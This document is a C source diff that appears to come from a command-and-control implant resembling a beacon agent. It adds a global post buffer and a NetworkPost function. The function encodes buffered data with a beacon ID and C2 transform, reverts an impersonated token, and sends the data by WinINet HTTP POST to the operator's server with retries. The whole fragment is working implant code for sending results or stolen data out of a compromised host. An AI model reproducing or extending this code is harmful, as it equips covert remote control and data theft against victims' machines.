@@ -12,6 +12,8 @@ HINTERNET gInternetConnect;
 DWORD gNetworkOptions;
 DWORD gContext;
 HINTERNET gInternetOpen;
+int gPostBufferLength = 0;
+char* gPostBuffer = NULL;
 
 #define PROTOCOL_HTTP 0
 #define PROTOCOL_DNS 1
@@ -172,6 +174,65 @@ int NetworkGet(const char* getUri, SESSION* session, char* data, const int maxGe
 	InternetCloseHandle(hInternet);
 	IdentityImpersonateToken();
 	return result;
+}
+
+void NetworkPost(const char* uri)
+{
+#define MAX_ATTEMPTS 4
+#define ATTEMPT_SLEEP 500
+#define MAX_BID 128
+	const char* acceptTypes[] = { "*/*", NULL };
+
+	char finalUri[MAX_URI];
+	memset(finalUri, 0, sizeof(finalUri));
+
+	char bid[MAX_BID];
+	memset(bid, 0, sizeof(bid));
+
+	TRANSFORM transform;
+	memset(&transform, 0, sizeof(transform));
+
+	if(!gPostBufferLength)
+		return;
+
+	TransformInit(&transform, gPostBufferLength);
+	snprintf(transform.uri, MAX_URI, "%s", uri);
+	snprintf(bid, sizeof(bid), "%d", gSession.bid);
+	TransformEncode(&transform, S_C2_POSTREQ, bid, strlen(bid), gPostBuffer, gPostBufferLength);
+
+	if(strlen(transform.uriParams))
+		snprintf(finalUri, sizeof(finalUri), "%s%s", transform.uri, transform.uriParams);
+	else
+		snprintf(finalUri, sizeof(finalUri), "%s", transform.uri);
+
+	IdentityRevertToken();
+
+	for(int attempts = 0; attempts < MAX_ATTEMPTS; attempts++)
+	{
+		HINTERNET hRequest = HttpOpenRequestA(
+			gInternetConnect,
+			S_C2_VERB_POST,
+			finalUri,
+			NULL,
+			NULL,
+			acceptTypes,
+			gNetworkOptions,
+			&gContext);
+		NetworkUpdateSettings(hRequest);
+		HttpSendRequestA(hRequest, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength);
+		if(NetworkCheckResponse(hRequest))
+		{
+			InternetCloseHandle(hRequest);
+			break;
+		}
+
+		InternetCloseHandle(hRequest);
+		Sleep(ATTEMPT_SLEEP);
+	}
+
+	TransformDestroy(&transform);
+	gPostBufferLength = 0;
+	IdentityImpersonateToken();
 }
 
 void NetworkConfigureHttp(LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszAgent)
